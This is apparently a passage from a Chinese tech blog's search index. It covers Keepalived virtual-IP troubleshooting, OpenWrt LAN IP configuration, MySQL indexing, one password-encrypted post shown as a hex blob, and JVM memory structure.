FAQMaster 节点无法访问虚拟 IPMaster 节点里的 Keepalived 服务配置好 VIP 后，通过 ip addr 可以看到 VIP 已经顺利挂载，但是在 Master 节点内部无法 Ping 通。原因是 keepalived.conf 文件中默认配置了 vrrp_strict，需要把它注释掉，重启 Keepalived 的服务后即可以 Ping 得通。vrrp_strict 参数表示严格遵守 VRRP 协议，下列情况将会阻止 Keepalived 的虚拟 IP 功能： 1）单播邻居 2）没有 VIP 地址 3）在 VRRP 版本 2 中有 IPv6 地址 Backup 节点无法访问虚拟 IP虚拟 IP 的网段要和 Real Server 真实 IP 的网段地址一致，比如 Master 节点与 Backup 节点的 IP 网段为 192.168.171，那么虚拟 IP 必须是 192.168.171.*，否则 Backup 节点无法访问虚拟 IP。 Nginx 服务使用非默认的 80 端口若 Nginx 服务使用非默认的 80 端口，那么在 Keepalived 的配置文件 keepalived.conf 里，只需要正常配置 virtual_ipaddress 参数即可，不需要关心 Nginx 具体使用的是哪个端口，因为默认可以通过 http://vip:port 的地址格式访问 Nginx。 Master 节点与 Backup 节点同时生成了虚拟 IP关闭系统防火墙，让 Master 节点和 Backup 节点可以互相通信，否则会导致主备节点都生成了两个 VIP（脑裂现象）。也可以配置主备节点之间的防火墙协议（如下），开启其他需要通信的 IP 即可： 12345678# 开启VRRP协议# firewall-cmd --direct --permanent --add-rule ipv4 filter INPUT 0 --protocol vrrp -j ACCEPT# 或者# firewall-cmd --direct --permanent --add-rule ipv4 filter INPUT 0 --in-interface em1 --destination 192.168.1.163 --protocol vrrp -j ACCEPT# 重载配置生效# firewall-cmd --reload 商业云服务器对 Keepalived 的支持以阿里云服务器举例，可以使用 HAVIP + VPC（Virtual Private Cloud，虚拟私有云） 来实现 Keepalived，但是普通的 ECS 是不适用的，要求必须使用 VPC 类型的 ECS，而且虚拟 IP 需要另外申请（不支持自建 VIP）。阿里云目前不支持自建 LVS 高可用负载均衡，但有现成的商业产品–负载均衡 SLB 可以选择。值得一提的是，云服务器 ECS 不支持组播和广播，这点需要注意一下。 参考博客 Keepalived 配置文件参数详解 Keepalived 虚拟 VIP 无法访问的问题 Centos 8 开启防火墙后，脑裂的问题解决 基于华为云搭建 Keepalived + Nginx 实验 Nginx 高可用集群解决方案 Nginx + Keepalived Keepalived + Nginx 实现搭建双机主备 + 双主热备 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux web服务器"},{title:"OpenWrt 设置 IP 地址",url:"/posts/ee7f1a35.html",text:'前言由于路由器的 IP 一般都是 192.168.1.1，当接入了二级路由器时，为了让二级路由器的 IP 不与一级路由器的 IP 冲突，此时一般需要更改二级路由器的 IP 地址，下面将介绍 OpenWrt 如何通过可视化界面和更改配置文件的方式来指定 IP 地址。 查看 OpenWrt 的 IP通过 SSH 连接到 OpenWrt 后，在终端输入 ifconfig 命令，可以看到 OpenWrt 默认的 IP 地址是 192.168.1.1。这里的 SSH 登录账号，一般是 OpenWrt 可视化管理界面的登录账号，用户名一般为 root。 通过配置文件更改 IP编辑配置文件 /etc/config/network，将 192.168.1.1 改为自定义的 IP 地址（例如：192.168.2.1），然后重启路由器即可。 12345678910# vim /etc/config/networkconfig interface \'lan\' option ifname \'eth0.1\' option force_link \'1\' option type \'bridge\' option proto \'static\' option ipaddr \'192.168.2.1\' option netmask \'255.255.255.0\' option ip6assign \'60\' 通过可视化界面更改 IP菜单栏导航到：NetWork -&gt; Interfaces -&gt; LAN -&gt; General Setup，更改 IPv4 address 的 IP 地址，然后点击 保存 &amp; 应用 即可。 补充说明OpenWrt 重启后，通过 ifconfig 命令查询 IP 地址是否成功更改。值得注意的是，当二级路由器的网段更改后，那么通过 DHCP 分配给客户端设备的网段也会随着变更，例如当路由器的 IP 更改为 192.168.2.1，那么客户端设备的网段将更改为 192.168.2，同时 IP 地址为 192.168.2.xxx。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"树莓派"},{title:"MySQL 索引的使用",url:"/posts/ba389f6e.html",text:'索引介绍索引是一种特殊的文件（InnoDB 数据表上的索引是表空间的一个组成部分），包含了对数据表里所有记录的引用指针。索引分单列索引和组合索引。单列索引，即一个索引只包含单个列，一个表可以有多个单列索引，但这不是组合索引。组合索引，即一个索引包含多个列。创建索引时，需要确保该索引是应用在 SQL 查询语句的条件 (一般是 WHERE、JOIN 子句的条件)。 索引的类型（四种） FULLTEXT：即为全文索引，目前只有 MyISAM 引擎支持，其可以在 CREATE TABLE，ALTER TABLE，CREATE INDEX 使用，不过目前只有 CHAR、VARCHAR、TEXT 列上可以创建全文索引 HASH：由于 HASH 的唯一性及类似键值对的形式，很适合作为索引，HASH 索引可以一次定位，不需要像树形索引那样逐层查找，因此具有极高的效率。但是，这种高效是有条件的，即只在 “=” 和 “in” 条件下才高效，对于范围查询、排序及组合索引仍然效率不高 BTREE：一种将索引值按一定的算法，存入一个树形的数据结构中（二叉树），每次查询都是从树的入口 Root 开始，依次遍历 Node，获取 Leaf，这是 MySQL 里默认和最常用的索引类型 RTREE：在 MySQL 很少使用，仅支持 geometry 数据类型，支持该类型的存储引擎有 MyISAM、BDb、InnoDb、NDb、Archive，相对于 BTREE，RTREE 的优势在于范围查找 索引的种类（五种） 普通索引：仅加速查询（BTREE 类型） 全文索引：对文本的内容进行分词和搜索 唯一索引：加速查询 + 列值唯一（可以有 NULL 值） 主键索引：加速查询 + 列值唯一（不可以有 NULL 值） + 每个表只能有一个主键索引 组合索引：多列值组成一个索引，专门用于组合搜索，其效率大于索引合并（使用多个单列索引组合搜索） 索引的操作创建索引： 1234567891011--创建普通索引CREATE INDEX index_name ON table_name(col_name);--创建唯一索引CREATE UNIQUE INDEX index_name ON table_name(col_name);--创建普通组合索引CREATE INDEX index_name ON table_name(col_name_1, col_name_2);--创建唯一组合索引CREATE UNIQUE INDEX index_name ON table_name(col_name_1, col_name_2); 通过修改表结构创建索引： 1ALTER TABLE table_name ADD INDEX index_name(col_name); 创建表时直接指定索引： 12345CREATE TABLE table_name ( ID INT NOT NULL, col_name VARCHAR (16) NOT NULL, INDEX index_name(col_name)); 删除索引： 12345--直接删除索引DROP INDEX index_name ON table_name;--修改表结构删除索引ALTER TABLE table_name DROP INDEX index_name; 其它相关命令： 12345678910111213--查看表结构desc table_name;--查看创建表的SQLshow create table table_name;--查看索引show index from&nbsp;table_name;--查看执行时间set profiling = 1;SQL ...show profiles; 索引使用的代价 索引虽然可以大大提高了查询速度，但同时也会降低更新表的速度，如对表进行 INSERT、UPDATE 和 DELETE 操作；因为更新表时，MySQL 不仅要保存数据，还要更新索引文件 建立索引会占用更多的磁盘空间，这是因为需要分配磁盘空间给索引文件，一般情况这个问题不太严重，但如果在一个大表上创建了多种组合索引，索引文件的体积会膨胀得很快 索引适用的场景索引创建的时机一般来说，在 WHERE 和 JOIN 子句中出现的列需要建立索引，但也不完全如此，因为 MySQL 只对 &lt;、&lt;=、=、&gt;、&gt;=、BETWEEN、IN 以及某些时候的 LIKE 才会使用索引。例如下述的 SQL 语句，就需要对 city 和 age 列建立索引，由于 mytable_m 表的 userame 也出现在了 JOIN 子句中，因此也有对它建立索引的必要。 1SELECT t.Name FROM mytable_t LEFT JOIN mytable_m ON t.Name=m.username WHERE m.age=20 AND m.city=\'郑州\' ; 特别注意：上面提到只有某些时候的 LIKE 才需建立索引，因为在以通配符 % 开头作查询时，MySQL 不会使用索引；只有以通配符 % 结尾做查询时，MySQL 才会使用到索引。但有一种情况例外，那就是当触发了覆盖索引（select 的数据列只从索引中就能够取得，不必读取数据行，换句话说查询列要被所建的索引覆盖）的情况下，以通配符 % 开头作查询 MySQL 也会使用索引。例如：如果表里面只有 id 和 username 两个字段且都加了索引，那么 select * like \'%username\' 查询也是会使用索引的，前提是 select 数据列都加了索引。 哪些字段应该创建索引 增删改非常频繁的字段不适合作为索引 查询中与其他表关联的字段，例如外键应该建立索引 WHERE 和 JOIN 子句中，较频繁作为查询条件的字段应该创建索引 查询中排序（order by）、分组（group by）、统计的字段应该建立索引 唯一性太差的字段不适合创建索引，尽管频繁作为查询条件，例如：性别字段 索引不生效的情况 对于多列索引，如果不是使用的第一部分，则不会使用索引 如果 MySQL 估算使用全表扫描要比使用索引快，则不会使用索引 like 查询，即是以 % 开头的查询不会使用索引，除非 select 数据列都加了索引 如果列类型是字符串，那一定要在条件中将数据使用单引号包起来，否则索引不生效 如果条件中有 or，即使其中有部分条件带索引也不会使用。换言之，必须所有列都建有索引才有效 索引使用注意事项 针对普通查询 避免使用 select * 连表时注意条件类型需一致 创建表时尽量时 char 代替 varchar &nbsp;count (1) 或 count (列) 代替&nbsp;count (*) 使用表连接（JOIN）来代替子查询（Sub-Queries） 针对索引使用 使用组合索引代替多个单列索引（经常使用多个条件查询时） 索引散列值（重复多的值）不适合建索引，例如：性别字段不适合建索引 索引不会包含有 NULL 值的列，只要列中包含有 NULL 值都将不会被包含在索引中，组合索引中只要有一列含有 NULL 值，那么这一列对于此组合索引就是无效的，因此在数据库设计时不要让字段的默认值为 NULL 不要在列上进行运算，例如 select * from users where YEAR(adddate)&lt;2007，将在每个行记录上进行运算，这将导致索引失效而进行全表扫描，因此可以改成 select * from users where adddate&lt;’2007-01-01′ 尽量使用短索引，对串列进行索引，如果可能应该指定一个前缀长度。例如：如果有一个 CHAR (255) 的列，如果在前 10 个或 20 个字符内，多数值是惟一的，那么就不要对整个列进行索引；短索引不仅可以提高查询速度，还可以节省磁盘空间和 I/O 操作 MySQL 5.0 之前，SQL 查询只能使用一个索引，因此如果 WHERE 子句中已经使用了索引的话，那么 order by、group by 中的列是不会使用索引的。因此如果数据库默认排序可以符合要求的情况下，不要使用排序操作，同时尽量使用不包含多个列的排序，如果需要最好给这些列创建组合索引 查看索引的使用效果执行计划Explain + 查询 SQL，用于显示 SQL 执行信息参数，根据参考信息可以进行 SQL 优化或者判断索引是否生效 查看索引的使用情况1show status like \'%Handler_read%\'; handler_read_key：这个值越高越好，越高表示使用索引查询到的次数越多 handler_read_rnd_next：这个值越高，说明查询效率低效 补充说明MySQL 查询只能使用一个索引？MySQL 5.0 之前，SQL 查询只能使用一个索引，所以要合理使用组合索引，而不是单列索引。与其说是 “数据库查询只能用到一个索引”，倒不如说和全表扫描、只使用一个索引的查询速度比起来，去分析多个索引二叉树更加耗费时间，所以绝大多数情况下数据库都是用一个索引。特别注意：从 MySQL 5.1 开始，引入了索引合并优化技术，对同一个表可以使用多个索引分别进行条件扫描。 1select count(1) from table1 where column1 = 1 and column2 = \'foo\' and column3 = \'bar\'; 例如上面的语句，当数据库有 N 个索引并且查询中分别都要用上它们的情况下：查询优化器（用于生成执行计划）需要进行 N 次主二叉树查找（这里主二叉树的意思是最外层的索引节点），此时的查找流程大概是：查出第一条 column1 主二叉树等于 1 的值，然后去第二条 column2 主二叉树查出 foo 的值并且当前行的 coumn1 必须等于 1，最后去 column3 主二叉树查找 bar 的值并且 column1 必须等于 1 和 column2 必须等于 foo。如果这样的流程被查询优化器执行一遍，就算不死也半条命了，查询优化器可等不及把以上计划都执行一遍，贪婪算法（最近邻居算法）可不允许这种情况的发生。所以当遇到上面的语句，数据库只要用到第一个筛选列的索引（column1），就会直接去进行表扫描了。所以与其说是数据库只支持一条查询语句只使用一个索引，倒不如说 N 个独立索引同时在一条语句使用的开销比只使用一个索引还要大。最佳推荐是使用 index(column1, column2, column3） 这种组合索引，此组合索引可以把 B+Tree 结构的优势发挥得淋漓尽致。一条主二叉树（column=1），查询到（column=1）节点后基于当前节点进行二级二叉树（column2=foo）的查询，在二级二叉树查询到（column2=foo）后，去三级二叉树（column3=bar）查找，这样查询效率会高跟多。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"数据库"},{title:"海珠区江南西路游玩攻略",url:"/posts/c7942874.html",text:"4cfab7e4fdfd9afdbf1592f9652b8a194263aa6a7e6b4c103fbd9ff49c09b0448cdca81362464dc5686f95504da6299baa7ecfa933a0cb35661a0afea4caf1af81500861d70820a7508d0e06bdee9ab10e1087d359951f6c670591fb18cb97c647a4991346818d0768448394aaf192ecbb765e608125d10be3bef82752a051bee695747e33be490d040bab2b2207a8ddafe3c237d2e191ba113aadfbeced1a23e41ffb0900862aba9d23e7e70ed3d760ee97232c06ba590def8d115d8c7f8d5043680f76107c0f03a0cf63bf14d175d75c143289faf258d2ac2b0c381d5538539c2793540465d127bf4c5c6486e6a8609efa94707c7dc2f4a308809a628af088158c54df0eb98c1d22e514b5e8f17ec32d66900511ec95e82cba79da9ce9d2ff0779ed4b5f8e44b38cb5cd33ddb3f5e17d738ccb05f48b4402c7881c3e63234c8feab92be78f929c4380d2531414e4729185acc02e933bc3c0af637267fa0250c33a22ad3ac3073bd799fabe2cff5637f8866619450f1942597d62754d0c5bfb17b193a5f2a307dd6372a1b4a5767d5dfa7807263461a6445a04c26f38b7d2d0bfe5c09001d6797fc7301172ca92e49825a0abed29a62aec5940ca20d0e8ba726d4160c64aec06bfd21d0c957c181cc5df0ec501aee6486e3a5f922b313134a0f39d95e1a718958277c437578a2008bc56a80f28a32a94318799fa60299e88af8dfaacd2dd0b14861e50ffa61f2299fd448181f47668122d0286a58569160e3ad0a83cc3616a688a66b9ec18af7e9d116dde6c21f14c6b0052a03f3d959e777d06ae6b142a844a3024b1dafafcc585ba005be9cf40c9e1409d6edf2b07dbfb64e120e5049bc3d3e99535cb211356f4be0e74058e8cbe919565d6eb80c445f839f4f2f0d2dc00f4456a2d0edf524d0aff7b16622a6bc6f7e49d63065cdc04791679b796d7dab30d3acd4a19f06425825c52065b670757e1877f4cb4145b9321dc945d04de2ff139bf1942dbce38e761d9ff3fb19614ce249fa132c8c42ec6f2f522625d274576ae1e4bc137182bb12da631c8097880875d5911282b947fd00a8382b40570e060dbe686ddfc1033754aec6466abbf4a5424ce6830292ac52217187a3abaa52870aa9476502f931721c9d7f507e2e2c146b600958408204737cce7e062fa0e9739e6abf2a11ce5c8ef1960fdffb064fc225f2a0c563ffd9b2c8c5e451e1fcb957a3412c6d0b002c356dee70b13656bad862040019d19a15ccb60ab0d405818fe96a19d3ee9094bb677e1d1113b0d6643d0c479a5a959c01b9ebbd6a12c8b2ef0fe2e75a5503a2cb305f64a25194cb96b91c5dab093355573a705043e4d4cc00c9fd7d85271c88ec8d2e4d8536f35a0c1d51a6204a8b7c5114fec57c63bdc7650ca12fb866fe32466639027e0ec09fd0d2ffeaedac64cda547c0614194dbb2b7a9c3dbdc36d74548a5121db7d16f17860c3e7fad6fb711e371940deab7b6fc39434330264843ecd76da88030dc81f429ad0bdeba0e298746035f94abeb19c22a4996c2aae3071ddf36bb50a0f5fdceb674c286088b5404fd62b00ef2e0e3131b0f2d70f478114996b0912e9fa82a2f4bd6733cbd51913a1fc79f81b0ba9482f7952b6a235f7c1f0648253952d3db05ea08ff5f7f43bf939b1b0166f349164ef1542e6d3b924b5ffd50469271de0067b705179f41c925af10b947d293def32cbe3bcb44e289a46a5300be199a7abbb76865403321531901d5a686341e3a02b0410e2698af0ac012e25ac7c384091554a7445ebe02d0652d9d6d328b02640c03a042bf28947f0e06f14906390a038ba0d9117ea887f7d4b035147795f0d3edfdcaaba7c40e023a517ab4c6466a973c2f5ccd1a6a6f27a9a5472bd6e6fd678dd3be27068de5397b6d57f180147a9bf5bd80fcaebcb4d20b6fccd3f6112886834828711808734e2dcb8145d6e03ea2b449c736b7181a47936d22341339fac2cbe343b38a9bb6b3a372e5c0d34c35e595e0f902d621ee0d4142616f293549232512f83a3b47c82985b3d6f0d07283a18e44663aa16fa79dc27c033de0d64305e229032970044c18c58791c29d5e1fc62c546f949ea7586b467ab0be781e7d59734009773e420b3b266cd339f84d689f826d8f55ac2b37bdaced95fb9cf8dd5cb125f8772120c790135c0bbba03cc775a21799be0146b4c696880a53edd80d68716a757fcfe8c29e3cc08a2628c341162ea152a7c512988f74817e6d349e554a6c7bcacbc6ab349a500468029544087d334d181560b5a5d0ee35ef44bc77ed92968fe6ab5b3a06a079e128a8ec3ab439bad9999e52909f0b9263bab7c195071a3fe97f5f19623986ec1373c8c61842699a26257a0e4b081a08424e8f047888ac113baa9930191988c564edf0f5e8bed2a461a51db4271a759b9ac3e91a0d84137dd6fab99f6b444cc2854e392c15f56344a7ef0d7812818d145b1f76fe79a30f0d25512b5875d0cce0ad6b3fa15e4f187789c68650c14ab5408f4b41045db4f04d45293f207dca3b136a3905722b363521c0d7e7fc982b55b8f35eb10c1a831148f59e75c137a11bbabc12bc8b1e5958070870e1934c4948e8c04f95bedd0b126c566b5437149e7a5fedf9b1ccd2fbf7ca66ee2d372209b106bb1067efbd981f728744958696d16a4f6ad9f006aabe44bf831724937192fe9def71181d5b3bb085543a894042b2fea20e89e831bc235db2f39c7fb6747fed074d1d4b74397e0e139c93af7be3251c4a90d4c52571240728188257d76ed7e19555f81a61846986b31bd4395a31c5bdd94b8f138d3ff22d1827f1c85ffe75eaee547fe5c90b70ded5fc14213846a21a908f77065408bbe9f54f4635bd724f65b9e7694eb08bbb5e0d20b41276f4e16b2ad809e7586299fb4fe0934bc41e64c8dd92526e90d8ddad9ee7f8b28a0a99a6eb3c9e4259245068a46eab7f9e223b9af856f9a011b1f8c76dab3f72d4f1b035cf9b2ca81280f4b5c9802a096b90b37d8a865e8a9e0ac437a1b995483ba565c711f68eeec2f0ace40b511889a41b7dbd16ae49ca08f4f5c5f6e0c8806356e50e4656f64da94af217db7b526d894fb6873b4578dedf84f04315646c118a8320f87c3af04f56091e12d2501700d94246f12654355c3a12a2822f2d442890653780b80f16959d04dea553648f33fd52ab0d709ca56b9fe3297fe75209559883347d9ed4e91679827943c66e4f95cd7114e344cd1a50ce83dd744682362a725e2f13aac0fa51e5afc02352399d79d22a1b4edcbd2a5aa8054771ac0feba3508490cc380cd2534681327fb7ff00a06f43bc02e98e83168f315162ed82af569e6098bce540d28a3c282aa25d1a58c73cf879c030ba2c59b4ccfbd8af5f880fa25f5e5623702c51952d0c96348524c9239249212a5c79e8d4beb90b9c1a64410a756d3cf50d8e28069be0534a57ae1a9a93ba4394feee0ff5752d79a88e3c41aff8ca2851a9ee8916a37224312da82afb2e4971bd14d01327cc730cc877a6039ed56d22a1f233fae43cfd54aa65abbeb01f5bfaa2c39c7d9b8e35c7a43f7ea306dc521a50deed420e5527b406d4477fd6169a9cb256f48433acbdb1fffa98b734a137058eb82e882aa5a3ce73554019bc8b6ac6ce69ca85afeb5df87277d85ebfd123c439f92923816448703e01bde018d65811bdace3db3ac8664e66f3a878eb72e27aebc2244c519ddac3ff0d01778a1019c572ca35edf7449dbdfff0c2876cfee20d838a66d521f418602175a563c10cb190b926415d4067e2e4770eb5ef24e49637ccad4bb99820fa194cad240781f30d7461bdf9baea898a45a67dc0a69a0c2287d0350d8c424e41178eac4349f3dd5feb157ae6582f6fbcd8d5cf1a528b9d31542d0e5258c50704d0a0c88e72286525f8f99ca91735b9877a586e95ac84ba497ef3d34fc4db22e35b48d594cf9428af95dc42fbfce51cd1483129e33a4125d4d2ef48c733d9185d7aa03c92f5e4b58344aeb9b1414987013ec4d020a69c8d58d820dc78937be0702d7593d0186d702a78b25d522743a70ee5af1ae8c27f9a37e87855b827c5394dd4598e7d09d6662e8e57bce925106fb82f493e0b0ece63696c1f59d8e13964141756465a3086969e17182d726e99db089baf5cf0a5f0d5808dbab28f42c4d63b8f97ad6d1313d2a1e269e153919b2c56059a0fcb0e453fb201592bb64b7acd79eadba82ad245aa044f5cebf4d8560ff54a6a779fe7e8504769b9fed31f37c7dff6063b0d97a9d3d07394f69cb9edda4784749938d49305807815bafbf1d4528ae612e44aaab9388050ee45836754d98580fa004d6687fdf7fdae6d4162821f4aeb78425b44e52f4374a8e21deaaafc8af86f7bd1e23d1e28da19ff886daca17fb9d02c7a959ed9db20f34dac28511406232cf73880934073b6327f7b19cdd7612082089c54d108d824238e65947aff2fd29c490b286bb73b848080c737788d1cd9f13ede679c8dd8080f5274fad9e12915c0aa280270621a2d92d5ad8ea1e981b1b328fea1dcd627732780a7b7994b46a17140a1e9227e6fad852a37ffc3c064d544ea49cc490377796615c10077176a39ae3938e1e7fc92f40449928658b648be8d1ac02e549e76d6e94b63827fc1962487727360cd994dee0515494e582910085c91de59d4af7152820aa3a9181205b372fe19d633cb3fb407292593e5d5ccaa3636009cc83f5681fc967286e70ab7c9e80bf64660489e4695ddde1f0a46066a9e9cd5c5517d0bcc2309a1cf4e97f9997ffe161fc134a4a1b08fe97b5100888a4a6339002b04061af9e19b64165eb9830f07f96164eaf41db822ed6dbb4e233986850dd8eb8afda1d19cd0159897697f4fb0104b63ac41eca3f6a455743b47eb09369bcf17a9a3e0c12020fe62c87f6d2204f4a79fe9204337c0eae55ca8be46d72a418a276dfc528848a30f21342b4c40e0b5b9741ba1498d70d9fdeaf030c8b7fce834d77dec75d57879e1b32d78d4c26f65d19212e317a6aa07bdc613003b4ed348e17dec9c34dd5b30a9e4981f7f9752aa2e6827dd67fbb022f6e4a409aa881d99b91dabffddedf6a5ec2c6072f42d78cfb21761e1c061773511163cfb0084681aaab892d2bd525115270204035ff0160d4e6c825f75345bde7e9c37aa3e4897d5a06fe442664bd87bd39618089751f47a6d7964b2b13aba89be0ac2b2294e16558c24776bbf4e3b3ad2cf398d6904ef712e48847f213db76ae448e620574b4b510bbdc3e33188a443e6aace277ac7c2289c1dc308db6ad10d7fba27f039706debec4bfe363b6422fe03d2afd014e85225990dc7ec5aa3f92ca1bfab23ab4d44cd54711990506afec2fe7d33ef1b1377d453a4ba1947daf545ae6f1128c6a756c6a3de6477c47c635aa602d8e 请 输 入 阅 读 密 码.",tags:"加密博客"},{title:"JVM 内存结构与 GC 算法",url:"/posts/2f77f23a.html",text:'Java 虚拟机JVM 内存结构JVM 内存结构主要有三大块：栈、堆内存、方法区。堆内存是 JVM 中最大的一块，由新生代和老年代组成，不包括永久代（方法区）；而新生代内存又被分成 Eden 空间、From Survivor 空间、To Survivor 空间，默认情况下新生代按照 8:1:1 的比例来分配。方法区存储类信息、静态变量、常量、常量池等数据，是线程共享的区域，为了与 Java 堆区分，方法区还有一个别名 Non-Heap （非堆）。栈又分为 Java 虚拟机栈和本地方法栈，主要用于方法的执行。 堆内存堆内存（Heap）是 Java 虚拟机所管理内存最大的一块，各个线程之间共享，在虚拟机启动时创建，此区域的唯一目的就是存放实例对象，几乎所有的实例对象都在这里分配内存。堆内存是垃圾收集器（GC）管理的主要区域，因此很多时候被称为 “GC 堆”。由于现在垃圾收集器基本采用分代收集算法，所以堆内存还可以被分为新生代和老年代，而新生代内存又被分成 Eden 空间、From Survivor 空间、To Survivor 空间。Java 虚拟机规范的规定，堆内存可以在物理不连续的内存空间上，只要逻辑上是连续的即可。如果在堆内存中没有足够的内存完成实例分配，并且堆内存也无法再扩展时，将会抛出 OutOfMemoryError 异常。 方法区方法区（Method Area）包含了类信息、静态变量、常量、常量池，是各个线程共享的内存区域。它存储已被虚拟机加载的类信息、静态变量、常量、常量池，即编译器编译后的代码等数据。为了与 Java 堆区分，方法区还有一个别名 Non-Heap （非堆）。对于习惯在 HotSpot 虚拟机上开发和部署程序的开发者来说，很多人愿意把方法区称为” 永久代”（Permanent Generation），本质上两者并不等价，仅仅是因为 HotSpot 虚拟机的设计团队选择把 GC 分代收集扩展至方法区，或者说使用永久代来实现方法区而已。相对而言，垃圾收集行为在这个区域是比较少出现的，但并非数据进入了方法区就如永久代的名字一样” 永久” 存在了。这个区域的内存回收目标主要是针对常量池的回收和对类型的卸载，一般来说这个区域的回收 “成绩” 比较难以令人满意，尤其是类型的卸载，条件相当苛刻，但是这部分区域的回收确实是有必要的。当方法区无法满足内存分配需求时，将抛出 OutOfMemoryError 异常。方法区中的常量和静态变量引用的对象，可作为 GC Root。 Java 虚拟机栈Java 虚拟机栈（Java Virtual Machine Stacks），是线程私有的，生命周期和线程相同。每个方法执行的同时，会创建一个栈帧（Stacks Frame）用于存储局部变量表、操作数栈、动态链接、方法出口等信息。方法的执行，对应栈帧在虚拟机中入栈到出栈的过程（一句话总结：创建栈帧执行方法，程序计数器会指向栈顶）。局部变量表存放了编译期可知的各种基本数据类型（boolean、byte、char、short、int、float、double、long）、对象引用（Reference 类型，它不等同于对象本身，根据不同的虚拟机实现，它可能是一个指向对象起始地址的引用指针，也可能指向一个代表对象的句柄或者其他与此对象相关的位置）和 ReturnAddress 类型（指向了一条字节码指令的地址）。其中 64 位长度的 long 和 double 类型的数据会占用 2 个局部变量空间（Slot），其余的数据类型只占用 1 个。局部变量表所需的内存空间在编译期间完成分配，当进入一个方法时，这个方法需要在帧中分配多大的局部变量空间是完全确定的，在方法运行期间不会改变局部变量表的大小。在 Java 虚拟机规范中，对这个区域规定了两种异常状况：如果线程请求的栈深度大于虚拟机所允许的深度，将抛出 StackOverflowError 异常；如果虚拟机栈可以动态扩展（当前大部分的 Java 虚拟机都支持动态扩展，只不过 Java 虚拟机规范中也允许固定长度的虚拟机栈），当扩展时无法申请到足够的内存时会抛出 OutOfMemoryError 异常。Java 虚拟机栈引用的对象可作为 GC Root。 本地方法栈本地方法栈（Native Method Stack），与 Java 虚拟机栈发挥的作用相似，它们之间的区别不过是 Java 虚拟机栈为虚拟机执行 Java 方法（也就是字节码）服务，而本地方法栈则为虚拟机使用的 Native 方法服务。Java 虚拟机规范中对本地方法栈中的方法使用的语言、使用方式与数据结构并没有强制规定，因此具体的虚拟机可以自由实现它。甚至有的虚拟机（譬如 Sun HotSpot 虚拟机）直接就把本地方法栈和 Java 虚拟机栈合二为一。与 Java 虚拟机栈一样，本地方法栈区域也会抛出 StackOverflowError 和 OutOfMemoryError 异常。本地方法栈 Native 方法引用的对象可作为 GC Root。 程序计数器程序计数器（Program Counter Register）是一块较小的内存空间，它的作用可以看做是当前线程所执行的字节码的行号指示器，即保证线程切换后恢复到正确的执行位置。在虚拟机的概念模型里（仅是概念模型，各种虚拟机可能会通过一些更高效的方式去实现），字节码解释器工作时就是通过改变这个计数器的值来选取下一条需要执行的字节码指令，分支、循环、跳转、异常处理、线程恢复等基础功能都需要依赖这个计数器来完成。由于 Java 虚拟机的多线程是通过线程切换并获取时间片的方式来实现的，在任何一个确定的时刻，一个处理器（对于多核处理器来说是一个内核）只会执行一条线程中的指令。因此，为了线程切换后能恢复到正确的执行位置，每条线程都需要有一个独立的程序计数器，各条线程之间的计数器互不影响，独立存储，一般称这类内存区域为 “线程私有” 的内存。如果线程正在执行的是一个 Java 方法，这个计数器记录的是正在执行的虚拟机字节码指令的地址。如果正在执行的是 Natvie 方法，这个计数器值则为空（Undefined）。此内存区域是唯一一个在 Java 虚拟机规范中没有规定任何 OutOfMemoryError 异常情况的区域。 运行时常量池运行时常量池（Runtime Constant Pool）是方法区的一部分，用于存放编译期生成的各种字面量和符号引用。这部分内容在类加载后进入方法区的运行时常量池存放。运行时常量池另一个重要特征就是具有动态性。Java 语言并不要求常量一定只有编译期才能产生，运行期间也可以将新的常量放入池中，这种特性被开发人员利用的比较多的就是 String 类的 intern() 方法。 直接内存直接内存（Direct Memory）并不是虚拟机运行时数据区的一部分，也不是 Java 虚拟机规范中定义的内存区域，但是这部分内存也被频繁的使用，而且也可能导致 OutOfMemoryError 异常。在 JDK1.4 中新加入的 NIO 类，引入了一种基于通道（Channel）与缓存区（Buffer）的 I/O 方式。它可以使用 Native 函数库直接分配堆外内存，然后通过一个存储在 Java 堆中的 DirectByteBuffer 对象作为这块内存的引用进行操作。这样能在一些场景中提高性能，因为避免了 Java 堆和 Native 堆中来回复制数据。值得注意的是，本机的直接内存的分配不会受到 Java 堆大小的限制，但是会受到本机总内存的限制，这可能导致各个内存区域总和大于物理内存的限制，从而导致动态扩展时出现 OutOfMemoryError 异常。 通过参数来控制各区域的内存大小 -Xms，设置堆内存的最小空间大小 -Xmx，设置堆内存的最大空间大小 -XX:NewSize，设置新生代最小空间大小 -XX:MaxNewSize，设置新生代最大空间大小 -XX:PermSize，设置永久代（方法区）最小空间大小 -XX:MaxPermSize，设置永久代（方法区）最大空间大小 